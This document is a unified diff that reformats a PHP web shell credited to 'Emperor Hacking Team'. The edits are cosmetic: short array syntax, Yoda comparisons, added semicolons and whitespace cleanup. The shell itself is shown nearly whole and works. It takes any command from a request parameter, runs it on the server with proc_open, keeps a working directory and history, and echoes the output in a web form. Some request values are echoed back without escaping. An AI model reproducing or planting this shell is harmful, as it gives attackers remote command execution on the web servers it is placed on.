@@ -4,49 +4,46 @@
   session_start();
 if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
     $_SESSION['cwd'] = getcwd();
-    $_SESSION['history'] = array();
+    $_SESSION['history'] = [];
     $_SESSION['output'] = '';
 }
-  
+
   if (!empty($_REQUEST['command'])) {
       if (get_magic_quotes_gpc()) {
           $_REQUEST['command'] = stripslashes($_REQUEST['command']);
       }
-      if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false) {
+      if (false !== ($i = array_search($_REQUEST['command'], $_SESSION['history']))) {
           unset($_SESSION['history'][$i]);
       }
-    
+
       array_unshift($_SESSION['history'], $_REQUEST['command']);
-  
+
       $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . "\n";
 
       if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {
           $_SESSION['cwd'] = dirname(__FILE__);
       } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {
-          if ($regs[1][0] == '/') {
+          if ('/' == $regs[1][0]) {
               $new_dir = $regs[1];
           } else {
               $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
           }
-      
 
-          while (strpos($new_dir, '/./') !== false) {
+          while (false !== strpos($new_dir, '/./')) {
               $new_dir = str_replace('/./', '/', $new_dir);
           }
 
-
-          while (strpos($new_dir, '//') !== false) {
+          while (false !== strpos($new_dir, '//')) {
               $new_dir = str_replace('//', '/', $new_dir);
           }
 
           while (preg_match('|/\.\.(?!\.)|', $new_dir)) {
               $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
           }
-      
-          if ($new_dir == '') {
+
+          if ('' == $new_dir) {
               $new_dir = '/';
           }
-      
 
           if (@chdir($new_dir)) {
               $_SESSION['cwd'] = $new_dir;
@@ -61,14 +58,13 @@ if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
           if (isset($aliases[$token])) {
               $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
           }
-    
+
           $p = proc_open(
               $_REQUEST['command'],
-              array(1 => array('pipe', 'w'),
-                           2 => array('pipe', 'w')),
+              [1 => ['pipe', 'w'],
+                           2 => ['pipe', 'w'], ],
               $io
           );
-
 
           while (!feof($io[1])) {
               $_SESSION['output'] .= htmlspecialchars(
@@ -85,13 +81,12 @@ if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
                   'UTF-8'
               );
           }
-      
+
           fclose($io[1]);
           fclose($io[2]);
           proc_close($p);
       }
   }
-
 
   if (empty($_SESSION['history'])) {
       $js_command_hist = '""';
@@ -99,7 +94,6 @@ if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
       $escaped = array_map('addslashes', $_SESSION['history']);
       $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
   }
-
 
 header('Content-Type: text/html; charset=UTF-8');
 
@@ -112,7 +106,7 @@ echo '<?xml version="Dive.0.1" encoding="UTF-8"?>' . "\n";
 
   <script type="text/javascript" language="JavaScript">
   var current_line = 0;
-  var command_hist = new Array(<?php echo $js_command_hist ?>);
+  var command_hist = new Array(<?php echo $js_command_hist; ?>);
   var last = 0;
 
   function key(e) {
@@ -159,10 +153,10 @@ function init() {
 
 
 <p><font color="#FF0000"><span style="background-color: #000000">&nbsp;Directory: </span> <code>
-<span style="background-color: #000000"><?php echo $_SESSION['cwd'] ?></span></code>
+<span style="background-color: #000000"><?php echo $_SESSION['cwd']; ?></span></code>
 </font></p>
 
-<form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="POST" style="border: 1px solid #808080">
+<form name="shell" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" style="border: 1px solid #808080">
 <div style="width: 989; height: 456">
   <p align="center"><b>
   <font color="#C0C0C0" face="Tahoma">Command:</font></b><input class="prompt" name="command" type="text"
@@ -172,13 +166,13 @@ function init() {
   &nbsp;<textarea name="output" readonly="readonly" cols="107" rows="22" style="color: #FFFFFF; background-color: #000000">
 <?php
 $lines = substr_count($_SESSION['output'], "\n");
-$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
+$padding = str_repeat("\n", max(0, $_REQUEST['rows'] + 1 - $lines));
 echo rtrim($padding . $_SESSION['output']);
 ?>
 </textarea> </p>
 <p class="prompt" align="center">
   <b><font face="Tahoma" color="#C0C0C0">Rows:</font><font face="Tahoma" color="#0000FF" size="2"> </font></b> 
-  <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" size="5" /></p>
+  <input type="text" name="rows" value="<?php echo $_REQUEST['rows']; ?>" size="5" /></p>
 <p class="prompt" align="center">
   <b><font color="#C0C0C0" face="SimSun">Edited By Emperor Hacking Team</font></b></p>
 <p class="prompt" align="center">
